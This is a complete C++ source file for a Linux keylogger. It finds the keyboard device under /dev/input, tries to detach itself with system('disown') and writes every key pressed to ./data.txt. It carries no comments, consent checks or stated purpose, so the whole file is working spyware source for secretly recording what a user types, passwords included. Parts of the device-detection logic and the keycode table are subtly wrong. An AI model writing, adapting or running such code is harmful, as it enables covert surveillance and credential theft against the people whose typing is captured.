#include <stdio.h>
#include <string>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <fstream>

#include <sys/stat.h>
#include <unistd.h>

#include <dirent.h>

#include <linux/input.h>
#include <iostream>

#define INPUT_DIR "/dev/input/"
#define EV_BUF_SIZE 16

const char *keycodes[] = {
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "MINUS",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFTBRACE",
    "RIGHTBRACE",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK",
    "KP7",
    "KP8",
    "KP9",
    "MINUS",
    "KP4",
    "KP5",
    "KP6",
    "PLUS",
    "KP1",
    "KP2",
    "KP3",
    "KP0",
    "DOT",
    "", "",
    "F11",
    "F12",
    "R0", 
    "", "", "", "", "", "", 
    "KPCOMMA",
    "KPENTER",
    "RIGHTCTRL",
    "KPSLASH",
    "SYSRQ",
    "RIGHTALT",
    "LINEFEED",
    "HOME",
    "UP",
    "PAGEUP",
    "LEFT",
    "RIGHT",
    "END",
    "DOWN",
    "PAGEDOWN",
    "INSERT",
    "DELETE",
    "MACRO",
    "MUTE",
    "VOLUMEDOWN",
    "VOLUMEUP"
};

static int is_char_device(const struct dirent *file){
    struct stat filestat;
    char filename[512];
    int err;

    snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, file->d_name);

    err = stat(filename, &filestat);
    if(err){
        return 0;
    }

    return S_ISCHR(filestat.st_mode);
}

char* get_keyboard_event_file(void){
    char *keyboard_file = NULL;
    int num, i;
    struct dirent **event_files;
    char filename[512];

    num = scandir(INPUT_DIR, &event_files, &is_char_device, &alphasort);
    if(num < 0){
        return NULL;
    }

    else {
        for(i = 0; i < num; ++i){
            int32_t event_bitmap = 0;
            int fd;
            int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z; 

            snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, event_files[i]->d_name);
            fd = open(filename, O_RDONLY);

            ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
            if((EV_KEY & event_bitmap) == EV_KEY){

                ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
                if((kbd_bitmap & event_bitmap) == kbd_bitmap){
                    keyboard_file = strdup(filename);;
                    close(fd);
                    break;
                }
            }

            close(fd);

        }
    }
    
    for(i = 0; i < num; ++i){
        free(event_files[i]);
    }

    free(event_files);

    return keyboard_file;

}

int main(int argc, char *argv[])
{
    system("disown");
    int fd, sz;
    unsigned i;
                
    char name[256] = "N/A";

    struct input_event ev[EV_BUF_SIZE]; 


    if ((fd = open(get_keyboard_event_file(), O_RDONLY)) < 0) 
        exit(0);

    std::ofstream file;
    file.open("./data.txt");
    file.close();


    for (;;) {
        sz = read(fd, ev, sizeof(struct input_event) * EV_BUF_SIZE);

        for (i = 0; i < sz / sizeof(struct input_event); ++i) {
            if (ev[i].type == EV_KEY)
            if (ev[i].value == 1)
            //fprintf(stderr,
            //    "%s\n", keycodes[ev[i].code]
            //);
            {
                file.open("./data.txt", std::ios_base::app);
                file << keycodes[ev[i].code] << '\n';
                file.close();
            }
        }
    }

    close(fd);

    return errno;
}